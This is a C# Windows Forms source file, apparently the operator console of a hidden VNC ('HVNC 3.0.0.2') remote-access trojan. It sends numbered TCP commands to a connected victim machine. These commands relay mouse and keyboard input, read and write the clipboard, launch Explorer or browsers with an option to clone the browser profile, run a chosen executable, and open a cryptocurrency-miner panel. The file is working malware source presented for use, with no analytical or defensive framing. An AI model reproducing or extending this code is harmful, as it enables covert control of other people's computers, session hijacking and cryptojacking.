using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Drawing;
using System.Threading;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;

namespace HVNC
{
    public partial class FrmVNC : Form
    {

        private TcpClient tcpClient_0;

        private int int_0;

        private bool bool_1;

        private bool bool_2;

        public FrmTransfer FrmTransfer0;

        public FrmMiner Miner_0;

        public PictureBox VNCBoxe
        {
            get
            {
                return this.VNCBox;
            }
            set
            {
                VNCBox = value;
            }
        }

        public ToolStripStatusLabel toolStripStatusLabel2_
        {
            get
            {
                return this.toolStripStatusLabel2;
            }
            set
            {
                toolStripStatusLabel2 = value;
            }
        }


        public FrmVNC()
        {
            int_0 = 0;
            bool_1 = true;
            bool_2 = false;
            FrmTransfer0 = new FrmTransfer();
            Miner_0 = new FrmMiner();
            InitializeComponent();

            VNCBox.MouseEnter += new EventHandler(VNCBox_MouseEnter);
            VNCBox.MouseLeave += new EventHandler(VNCBox_MouseLeave);
            VNCBox.KeyPress += new KeyPressEventHandler(VNCBox_KeyPress);
         
    }


        private void VNCBox_MouseEnter(object sender, EventArgs e)
        {
            VNCBox.Focus();
        }

        private void VNCBox_MouseLeave(object sender, EventArgs e)
        {
            FindForm().ActiveControl = null;
        }
        private void VNCBox_KeyPress(object sender, KeyPressEventArgs e)
        {
            SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
        }

        private void VNCForm_Load(object sender, EventArgs e)
        {

            if (FrmTransfer0.IsDisposed)
            {
                FrmTransfer0 = new FrmTransfer();
            }

            FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);

            tcpClient_0 = (TcpClient)base.Tag;

            VNCBox.Tag = new Size(1028, 1028);

            SendTCP("0*", tcpClient_0);

        }

        

        public void Check()
        {
            try
            {
                if (FrmTransfer0.FileTransferLabele.Text == null)
                {
                    toolStripStatusLabel2.Text = "Idle";
                }
                else
                {
                    toolStripStatusLabel2.Text = FrmTransfer0.FileTransferLabele.Text;
                }
                
            }
            catch
            {

            }

        }


        private void timer1_Tick(object sender, EventArgs e)
        {



            checked
            {
                int_0 += 100;
                if (int_0 >= SystemInformation.DoubleClickTime)
                {
                    bool_1 = true;
                    bool_2 = false;
                    int_0 = 0;
                }
            }
        }

        private void CopyBtn_Click(object sender, EventArgs e)
        {
            SendTCP("9*", tcpClient_0);
        }

        private void PasteBtn_Click(object sender, EventArgs e)
        {

            try
            {
                SendTCP("10*" + Clipboard.GetText(), tcpClient_0);
            }
            catch (Exception projectError)
            {
                ProjectData.SetProjectError(projectError);
                ProjectData.ClearProjectError();
            }
        }

        private void ShowStart_Click(object sender, EventArgs e)
        {
            SendTCP("13*", tcpClient_0);
        }

        private void VNCBox_MouseDown(object sender, MouseEventArgs e)
        {

            if (bool_1)
            {
                bool_1 = false;
                timer1.Start();
            }
            else if (int_0 < SystemInformation.DoubleClickTime)
            {
                bool_2 = true;
            }
            Point location = e.Location;
            object tag = VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)VNCBox.Width / (double)size.Width;
            double num2 = (double)VNCBox.Height / (double)size.Height;
            double num3 = Math.Ceiling((double)location.X / num);
            double num4 = Math.Ceiling((double)location.Y / num2);
            if (bool_2)
            {
                if (e.Button == MouseButtons.Left)
                {
                    SendTCP("6*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
                }
            }
            else if (e.Button == MouseButtons.Left)
            {
                SendTCP("2*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
            else if (e.Button == MouseButtons.Right)
            {
                SendTCP("3*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
        }

        private void VNCBox_MouseUp(object sender, MouseEventArgs e)
        {
            Point location = e.Location;
            object tag = VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)VNCBox.Width / (double)size.Width;
            double num2 = (double)VNCBox.Height / (double)size.Height;
            double num3 = Math.Ceiling((double)location.X / num);
            double num4 = Math.Ceiling((double)location.Y / num2);
            if (e.Button == MouseButtons.Left)
            {
                SendTCP("4*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
            else if (e.Button == MouseButtons.Right)
            {
                SendTCP("5*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
            }
        }

        private void VNCBox_MouseMove(object sender, MouseEventArgs e)
        {
            Point location = e.Location;
            object tag = VNCBox.Tag;
            Size size = ((tag != null) ? ((Size)tag) : default(Size));
            double num = (double)VNCBox.Width / (double)size.Width;
            double num2 = (double)VNCBox.Height / (double)size.Height;
            double num3 = Math.Ceiling((double)location.X / num);
            double num4 = Math.Ceiling((double)location.Y / num2);
            SendTCP("8*" + Conversions.ToString(num3) + "*" + Conversions.ToString(num4), tcpClient_0);
        }

        private void IntervalScroll_Scroll(object sender, EventArgs e)
        {

            IntervalLabel.Text = "Interval (ms): " + Conversions.ToString(IntervalScroll.Value);
            SendTCP("17*" + Conversions.ToString(IntervalScroll.Value), tcpClient_0);
        }

        private void QualityScroll_Scroll(object sender, EventArgs e)
        {


            QualityLabel.Text = "Quality : " + Conversions.ToString(QualityScroll.Value) + "%";
            SendTCP("18*" + Conversions.ToString(QualityScroll.Value), tcpClient_0);
        }

        private void ResizeScroll_Scroll(object sender, EventArgs e)
        {
            ResizeLabel.Text = "Resize : " + Conversions.ToString(ResizeScroll.Value) + "%";
            SendTCP("19*" + Conversions.ToString((double)ResizeScroll.Value / 100.0), tcpClient_0);
        }

        private void RestoreMaxBtn_Click(object sender, EventArgs e)
        {

            SendTCP("15*", tcpClient_0);
        }

        private void MinBtn_Click(object sender, EventArgs e)
        {

            SendTCP("14*", tcpClient_0);
        }

        private void CloseBtn_Click(object sender, EventArgs e)
        {
            SendTCP("16*", tcpClient_0);
        }

        private void StartExplorer_Click(object sender, EventArgs e)
        {
            SendTCP("21*", tcpClient_0);
        }

        private void StartBrowserBtn_Click(object sender, EventArgs e)
        {

            if (chkClone.Checked == true)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();

                SendTCP("11*" + Conversions.ToString(true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("11*" + Conversions.ToString(false), (TcpClient)base.Tag);
            }

        }

        private void SendTCP(object object_0, TcpClient tcpClient_1)
        {

            checked
            {
                try
                {
                    lock (tcpClient_1)
                    {
                        BinaryFormatter binaryFormatter = new BinaryFormatter();
                        binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
                        binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
                        binaryFormatter.FilterLevel = TypeFilterLevel.Full;
                        object objectValue = RuntimeHelpers.GetObjectValue(object_0);
                        ulong num = 0uL;
                        MemoryStream memoryStream = new MemoryStream();
                        binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
                        num = (ulong)memoryStream.Position;
                        tcpClient_1.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
                        byte[] buffer = memoryStream.GetBuffer();
                        tcpClient_1.GetStream().Write(buffer, 0, (int)num);
                        memoryStream.Close();
                        memoryStream.Dispose();
                    }
                }
                catch (Exception projectError)
                {
                    ProjectData.SetProjectError(projectError);
                    ProjectData.ClearProjectError();
                }
            }
        }

        private void VNCForm_KeyPress(object sender, KeyPressEventArgs e)
        {
            SendTCP("7*" + Conversions.ToString(e.KeyChar), tcpClient_0);
        }

        private void VNCForm_FormClosing(object sender, FormClosingEventArgs e)
        {

            Hide();
            e.Cancel = true;
            Miner_0.Hide();
        }

        private void VNCForm_Click(object sender, EventArgs e)
        {
            this.method_18((object)null);
        }

        void method_18(object object_0)
        {
            base.ActiveControl = (Control)object_0;
        }

        private void button1_Click(object sender, EventArgs e)
        {

            if (chkClone.Checked == true)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();

                SendTCP("30*" + Conversions.ToString(true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("30*" + Conversions.ToString(false), (TcpClient)base.Tag);
            }

        }

        private void button2_Click(object sender, EventArgs e)
        {

            if (chkClone.Checked == true)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();

                SendTCP("12*" + Conversions.ToString(true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("12*" + Conversions.ToString(false), (TcpClient)base.Tag);
            }

        }

        private void button3_Click(object sender, EventArgs e)
        {

            if (Miner_0.IsDisposed)
            {
                Miner_0 = new FrmMiner();
            }

            Miner_0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);

            Miner_0.Text = this.Text.Replace("{ HVNC 3.0.0.2 - Connected: Admin } - ", null);

            Miner_0.Show();
        }

        private void timer2_Tick(object sender, EventArgs e)
        {
            Check();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (chkClone.Checked == true)
            {
                if (FrmTransfer0.IsDisposed)
                {
                    FrmTransfer0 = new FrmTransfer();
                }
                FrmTransfer0.Tag = RuntimeHelpers.GetObjectValue(base.Tag);
                FrmTransfer0.Hide();

                SendTCP("32*" + Conversions.ToString(true), (TcpClient)base.Tag);
            }
            else
            {
                SendTCP("32*" + Conversions.ToString(false), (TcpClient)base.Tag);
            }
        }

        private void button5_Click(object sender, EventArgs e)
        {


        }

        private void closeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show("Are you sure ? " + Environment.NewLine + Environment.NewLine + "You lose the connection !", "Close Connexion ?", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
            if (dialogResult == DialogResult.Yes)
            {
                SendTCP("24*", tcpClient_0);
                Close();
            }

        }

        private void button6_Click(object sender, EventArgs e)
        {
            SendTCP("56*" + textBoxEXE.Text, (TcpClient)base.Tag);
        }

        private void button7_Click(object sender, EventArgs e)
        {
            SendTCP("4875*", tcpClient_0);
        }

        private void button8_Click(object sender, EventArgs e)
        {
            SendTCP("4876*", tcpClient_0);
        }

        private void VNCBox_Click(object sender, EventArgs e)
        {

        }

        private void VNCBox_MouseHover(object sender, EventArgs e)
        {
            VNCBox.Focus();
        }
    }
}
